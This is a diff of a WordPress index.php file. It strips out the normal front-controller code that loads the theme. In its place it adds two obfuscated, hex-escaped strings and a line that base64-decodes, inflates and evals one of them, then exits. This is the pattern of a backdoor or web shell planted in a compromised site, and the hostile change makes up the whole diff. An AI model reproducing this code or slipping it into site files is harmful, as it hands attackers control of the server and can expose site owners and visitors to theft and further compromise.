@@ -1,17 +1,6 @@
 <?php
-/**
- * Front to the WordPress application. This file doesn't do anything, but loads
- * wp-blog-header.php which does and tells WordPress to load the theme.
- *
- * @package WordPress
- */
-
-/**
- * Tells WordPress to load the WordPress theme and output it.
- *
- * @var bool
- */
-define( 'WP_USE_THEMES', true );
-
-/** Loads the WordPress Environment and Template */
-require __DIR__ . '/wp-blog-header.php';
+$Cyto = "Sy1LzNFQKyzNL7G2V0svsYYw9YpLiuKL8ksMjTXSqzLz0nISS1K\x42rNK85Pz\x63gqLU4mLq\x43\x43\x63lFqe\x61m\x63Snp\x43\x62np6Rq\x41O0sSi3TUPHJrNBE\x41tY\x41";
+$Lix = "yv2tqDMZ\x61K2\x61eNzR\x41gF\x62V\x2bl21f\x2bF\x42F7QR\x2b9MKxiz/z\x63hR\x612/\x2bn\x41dol3TH\x62ixEvDeF5lpeLJ/E\x63lt/Wj\x2bFxSJI\x43IK\x63VZPUMo\x434JgnEwND8/JLS3U\x63g4S\x63wZos\x41DPgsSNM\x2b6V/\x2bt23OVxN0ro6E5hQiN\x61\x62z7ZWuwhLH6ZSMizJpgEP5Q8torIKoP3xo4OXD3G179rS68y\x62U7no1\x2bxr\x2bVZiYTXY41\x617h3T\x62zSPMl\x41og\x6306GU\x2b0lX\x436ejpEzSTTLvN\x62TspoovhppNommnU1PHiI44TJfd\x62rEm07KjvT\x6102YXL\x635\x2bVur8\x62n\x43\x42u\x63yOo6uW0n7nNYtx269n/mJFN8uYzS3F6HgwlqSEVkUSIFisxP\x61O4\x41Z\x2bk3X/i\x2bGuW1QnUP9\x61evxG\x41RgGG\x42\x61XmgD\x41yiMh\x61F\x42GykU\x43wiT\x42\x61Wqt\x42PNvGiIeZShxGPTRwpEjM5pD\x61ZWms\x43jTj3yPZ\x412Z5o\x41jx/\x61Xq\x614vq6R1tItOmmIsP\x62\x42\x2b\x61\x2bgzL612Orh76rx\x42O\x62z220vwOkV\x63\x42XV\x43fLpWOtkKxP0NN2olpSRwhjZzrUdTV\x41m3sVng1xyzDz\x62I6j4\x42U\x61NNFlPizpj4\x438XoGHFn4viHWYquG\x41L22Ye8KQjG\x63R\x42uYyZ\x61wDuZROGX\x4142I\x41fo3KKO\x62TQ0ysVgxF3meT3919m0/e\x63q7\x2bmGX2XXJiFeZIRZx0vSMjQi\x41eZ6JOHxmuTf\x63fGK\x42UxO7u31Y61XYVwVR4\x63l\x63L/xK42/uOmV\x62\x611yFo2q2Jul\x63Hp\x2bO\x2b0qKoj0ZEh3GSPvHfLuG1/MRXn6e\x62UtPJJPv/RtuSMGoSsYiNFjuR0meuqK9/4\x2bjjJf8wftH\x41nkRj8oZQOXFSgEnXk\x61SgJP/INTFXlLZ3j\x61\x62NYrXy\x428msg\x625U84L\x412WTEi2J\x41NnJ0Qyke96S4xlfndjzdNfmGLvNfQWvtp4\x4299PqrkyT\x411sZMgQYMs2Vi1ipi5Glgohrt2\x61p\x41K\x61\x62jo\x42M/L9\x62\x2bR\x42Qj\x2b0WT1\x61/3I\x41y\x42wJe9zi\x41THQ/nI\x412\x42wJe9zh\x41jHQ/XI\x416\x42wJe9zg\x41zHQ/HI\x41\x2b\x42wJe";
+eval(htmlspecialchars_decode(gzinflate(base64_decode($Cyto))));
+exit;
+?>
